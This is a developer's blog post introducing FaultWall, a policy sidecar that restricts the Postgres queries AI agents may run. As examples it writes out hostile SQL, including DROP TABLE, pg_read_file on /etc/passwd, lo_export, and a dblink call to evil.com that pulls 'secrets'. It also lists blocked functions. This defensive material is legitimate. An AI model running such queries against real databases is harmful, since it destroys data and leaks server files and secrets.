I Gave an AI Agent My Database Password

March 2026 · 6 min read

A few months ago I started giving AI agents direct access to my Postgres database. Data analysis, report generation, some automated ops stuff. You know the drill — build a tool, give it a connection string, let the LLM figure out the SQL.

It worked great. For about three weeks.

The Problem

Here's what happens eventually: the LLM generates a query without a WHERE clause. Or it picks the wrong table. The prompt wasn't specific enough, so the agent does a full table scan across a large table. CPU spikes. Nobody gets paged because the query comes from a legitimate database user — it looks like normal application traffic.

That's the benign version. The same agent, with the same credentials, could just as easily generate:

  • DROP TABLE users; — the agent had write permissions
  • SELECT * FROM payments; — the agent didn't need payment data
  • SELECT lo_export(...); — export large objects to the filesystem
  • SELECT pg_read_file('/etc/passwd'); — read server files through Postgres
  • SELECT dblink('host=evil.com ...') — phone home to an external server

All of these are valid SQL. All of them execute with the agent's database credentials. Postgres doesn't know or care that an AI generated the query.

The "Confused Deputy" Problem

This has a name in security: the confused deputy. Your AI agent has legitimate credentials. It's authorized to be there. But it's executing actions on behalf of a prompt — and prompts can be manipulated, hallucinated, or just poorly written.

Traditional database security assumes the identity executing a query is the intent behind it. With AI agents, that assumption breaks. The agent is authorized. The query it generates might not be.

Postgres roles don't help much. They're static — an agent doing "summarize feedback" has the same permissions as when it's doing "delete old records." You can create read-only users, but most useful agent workflows need write access to at least some tables.

Row-level security? Better, but you're still trusting the agent to include the right predicates. And it doesn't protect against function calls like pg_sleep(999) or lo_export().

What I Built

I built FaultWall — a firewall that sits next to Postgres and enforces per-agent, per-task policies.

The idea: every agent identifies itself and declares what it's doing right now. FaultWall checks every query against that declaration.

# policies.yaml
agents:
  cursor-ai:
    missions:
      summarize-feedback:
        allowed_tables: [public.feedback]
        allowed_operations: [SELECT]
        conditions:
          - "WHERE created_at > now() - interval '30 days'"
      update-shipping:
        allowed_tables: [public.orders]
        allowed_operations: [SELECT, UPDATE]

  langchain-agent:
    missions:
      analyze-data:
        allowed_tables: [public.feedback, public.products]
        allowed_operations: [SELECT]

blocked_functions:
  - pg_sleep
  - pg_terminate_backend
  - lo_export
  - lo_import
  - pg_read_file
  - pg_read_binary_file
  - dblink
  - dblink_exec
  - set_config

Agents identify themselves through Postgres application_name:

SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
SELECT * FROM public.feedback WHERE created_at > now() - interval '30 days';
-- ✅ Allowed
SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
SELECT * FROM public.users;
-- ❌ Blocked: table not in mission scope
SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
SELECT pg_sleep(999);
-- ❌ Blocked: function in global blocklist

How It Actually Works

FaultWall is a single Go binary. It's a sidecar — it connects to your Postgres as a monitoring user, polls pg_stat_activity, and inspects active queries. It doesn't sit in the connection path. Your agents talk to Postgres directly, and FaultWall watches from the side.

Every query goes through a real PostgreSQL AST parser — the same C parser that Postgres itself uses, wrapped in Go via pg_query_go. No regex. The parser extracts:

  • Operations: SELECT, INSERT, UPDATE, DELETE, DROP, TRUNCATE
  • Tables: including CTEs, subqueries, JOINs — you can't hide a table reference
  • Function calls: pg_sleep, lo_export, dblink — even nested inside SELECT

This matters because regex-based parsers miss things like:

-- Regex thinks this is a harmless SELECT
SELECT pg_sleep(999);
SELECT lo_export(16389, '/tmp/dump.txt');
SELECT * FROM dblink('host=evil.com dbname=loot', 'SELECT * FROM secrets');

-- AST parser catches all of them

Two enforcement modes:

  • Monitor: Log violations, don't block. Run this first to see what your agents actually do.
  • Enforce: Kill violating queries via pg_terminate_backend().
DATABASE_URL=postgres://... \
POLICY_ENFORCEMENT=enforce \
POLICY_FILE=./policies.yaml \
./faultwall

What It Catches

I tested it with 11 scenarios covering the attacks I was most worried about:

  • ✅ Agent reads allowed table within mission — allowed
  • ❌ Agent touches table outside mission scope — blocked
  • ❌ Agent runs DELETE when only SELECT is allowed — blocked
  • ❌ Agent calls pg_sleep(999) — blocked
  • ❌ Agent calls lo_export() to dump files — blocked
  • ❌ Agent calls pg_read_file('/etc/passwd') — blocked
  • ❌ Unregistered agent tries anything — blocked
  • ❌ Connection without agent identity — monitored

All 11 passed on a real Postgres instance. Not unit tests — actual queries, actual enforcement, actual pg_terminate_backend() calls.

faultwall — enforce mode
# Agent connects and tries to access a table outside its mission
psql> SET application_name = 'agent:cursor-ai:mission:summarize-feedback';
psql> SELECT * FROM public.users;
FATAL: terminating connection due to administrator command
# FaultWall log:
Policy enforcement: BLOCKED pid=4821 agent=cursor-ai mission=summarize-feedback
reason=table_not_in_mission table=public.users op=SELECT
# Agent tries a dangerous function
psql> SELECT pg_read_file('/etc/passwd');
FATAL: terminating connection due to administrator command
Policy enforcement: BLOCKED pid=4822 agent=cursor-ai
reason=blocked_function:pg_read_file
# Agent stays within policy
psql> SELECT * FROM public.feedback WHERE created_at > now() - interval '30 days';
(47 rows) ✓

Limitations (Being Honest)

FaultWall polls pg_stat_activity every ~10 seconds. It's not an inline proxy. This means:

  • Short queries complete before detection. A fast DROP TABLE could execute before FaultWall sees it.
  • Long-running queries get caught. Analytics queries, agent workloads, anything that runs for more than a few seconds.
  • Agent identity is self-reported. application_name is spoofable. A malicious agent could claim to be a different agent.

The honest answer: FaultWall is a seatbelt, not an airbag. It catches the accidental damage that happens 95% of the time — confused agents, bad prompts, scope creep. It won't stop a sophisticated attacker who's already inside your database with full credentials.

I have an early prototype of an eBPF-based engine (private repo, Linux-only) that intercepts queries at the kernel level — real-time, zero polling delay. And cryptographic agent identity via signed JWTs instead of application_name. But neither is shipped and I'm not going to pretend they are.

Who This Is For

If you're giving AI agents database access — LangChain tools, Cursor, Claude, internal bots, whatever — and you don't have a policy layer between the agent and your data, you probably should.

FaultWall is MIT licensed, ~3000 lines of Go, no telemetry, no cloud dependency. One binary, one YAML file.

If you're running agents against Postgres and want to see what they're actually doing:

docker run -e DATABASE_URL=postgres://user:pass@host:5432/db \
  -e POLICY_FILE=/app/policies.yaml \
  -e POLICY_ENFORCEMENT=monitor \
  -p 8080:8080 \
  ghcr.io/shreyasxv/faultwall:main

You'll see per-agent metrics and violations at localhost:8080 in about 30 seconds. Start in monitor mode, see what your agents do, then flip to enforce when you're ready to block.
